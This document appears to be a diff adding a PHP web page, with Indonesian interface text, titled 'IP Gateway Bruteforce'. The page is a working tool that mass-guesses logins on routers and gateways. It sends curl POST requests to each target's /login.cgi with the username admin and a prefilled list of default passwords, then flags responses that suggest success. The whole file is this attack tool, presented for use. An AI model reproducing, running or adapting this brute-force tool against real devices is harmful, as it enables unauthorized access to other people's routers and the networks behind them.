@@ -1,0 +1,188 @@
+<?
+@set_time_limit(0);
+?>
+<html>
+<head>
+<title>IP Gateway Bruteforce</title>
+<meta name="viewport" content="width=1000, user-scalable=no">
+<meta name="theme-color" content="red">
+<link href="https://fonts.googleapis.com/css?family=Oxanium|Sacramento|Long+Cang|Single+Day|Lobster|Underdog|Caveat|Spicy+Rice|Cookie|Trade+Winds" rel="stylesheet" type="text/css">
+</head>
+<style type="text/css">
+body,a{
+background-image: url(https://wallpaperaccess.com/full/336598.jpg);
+      no-repeat  fixed;
+      background-size:100% 100%;
+color: #BBBBBB;
+font-family: Oxanium;
+font-size: 12px;
+text-align: left;
+}
+
+input,select,textarea,table,button {
+background: none repeat scroll 0 0 #000000;
+border: 2px solid #FF2300;
+border-left: 1px solid #FF2300;
+border-right: 1px solid #FF2300;
+color: #FFFFFF;
+margin: 0;
+box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;
+font-family: Oxanium;
+font-size: 17pt;
+}
+input[type=text]{
+  width: 640px;
+  height: 40px;
+  font-size: 17pt;
+  color: white;
+  border: 2px solid #FF2300;
+border-left: 1px solid #FF2300;
+border-right: 1px solid #FF2300;
+  font-family: Oxanium;
+  box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;
+}
+input[type=submit]{
+border: 2px solid #FF2300;
+border-left: 1px solid #FF2300;
+border-right: 1px solid #FF2300;
+box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;
+color: white; 
+margin: 5px;
+padding: 5px;
+font-family: Oxanium;
+}
+
+input:hover, textarea:hover, select:hover, button:hover {
+background: none repeat scroll 0 0 #220000;
+border: 1px solid #FF0000;
+font-size: 17pt;
+}
+.kotak{
+  background-color: transparent;
+  border: 2px solid #FF2300;
+border-left: 1px solid #FF2300;
+border-right: 1px solid #FF2300;
+box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;
+width: 750px;
+height: 810px;
+
+}
+
+option {
+background: none repeat scroll 0 0 #000000;
+}
+a{
+background-color: black;
+text-decoration: none;
+}
+textarea{
+resize: none;
+}
+
+</style>
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/JavaScript">
+$(document).ready(function(){
+$('pre').fadeIn(3000);
+
+$('input[type="text"]').click(function(){
+$(this).val('');
+});
+
+
+
+});
+
+</script>
+
+<body>
+
+<center><br>
+  <marquee scrollamount="9" direction="left" width="670" style="border: 3px red solid;box-shadow: 0 0 10px 0 #FF2300 inset, 0 0 20px 2px #FF2300;"><font color="white" face="Underdog" size="5" ><b>INI ADALAH TOOLS UNTUK MELAKUKAN PERCOBAAN LOGIN SECARA MASAL TANPA MENGEKSEKUSI LEWAT URL ASLI</font></marquee><BR>
+    <br><font color="white" face="Underdog" size="8" style="text-shadow: 4px 2px 1px red;"><b>IP GATEWAY Bruteforce</font>
+  <br><br><br><br>
+<form action="" method="POST">
+
+<input type="text" name="websites" placeholder="http://192.168.1.1"><br><br><br><textarea cols='50' rows='20' name="password" >
+admin
+user
+support
+theworldinyourhand
+inipassword
+password
+12345678
+12341234
+root
+admin123
+admintelecom
+anonymous</textarea>
+
+<br /><br /><br>
+
+<input type="submit" name="crack" value="CEK SAYANG">
+
+</form>
+</center>
+
+<?php
+if(isset($_POST['websites'],$_POST['password']))
+{
+
+$websites = nl2br($_POST['websites']);
+$password = nl2br($_POST['password']);
+
+$urls     = explode('<br />',$websites);
+$passwords = explode('<br />',$password);
+
+
+
+$pass_count = 0;
+foreach ($urls as $http){
+
+$url = trim($http)."/login.cgi";
+
+$check_url = substr($url,0,7);
+
+if($check_url !="http://"){
+$url = "http://".$url;
+}
+
+foreach($passwords as $pass){
+$cracking_curl = curl_init();
+curl_setopt($cracking_curl,CURLOPT_URL,"$url");
+curl_setopt($cracking_curl,CURLOPT_POSTFIELDS,"name=admin&pswd=$passwords[$pass_count]");
+curl_setopt($cracking_curl,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
+curl_setopt($cracking_curl,CURLOPT_RETURNTRANSFER,TRUE);
+curl_setopt($cracking_curl,CURLOPT_CONNECTTIMEOUT,9000);
+curl_setopt($cracking_curl,CURLOPT_TIMEOUT,9000);
+curl_setopt($cracking_curl, CURLOPT_HEADER, true);
+$result = curl_exec($cracking_curl);
+
+$status = curl_getinfo($cracking_curl); 
+
+
+
+if(preg_match("/ERROR|ERROR:|ERREUR|The password you entered for the|خطأ/i",$result) or $status['http_code']=='404'){
+
+echo "<br><br><center><a href='$url' target='_blank'>$url</a> -> <font color='red' size='3'>Username salah !</font><br />";
+
+}if($status['http_code']=='302' && preg_match("//",$result)){
+echo "<br><center><a href='$url' target='_blank'>$url</a> -> <font color='green'>Ada Respon [Password]</font> -> <b><font color='green'>$passwords[$pass_count]</font></b><br />";
+}else{
+echo "<br><center><a href='$url' target='_blank'>$url</a> -> <font color='orange'>Username & Password salah</font> -> <b> <font color='orange'>$passwords[$pass_count]</font></b><br />";   
+}
+
+
+
+if($pass_count == count($passwords) - 1){
+$pass_count = 0;
+}else{
+$pass_count++;
+}
+}
+}
+}
+?>
+
+</body>
+</html>
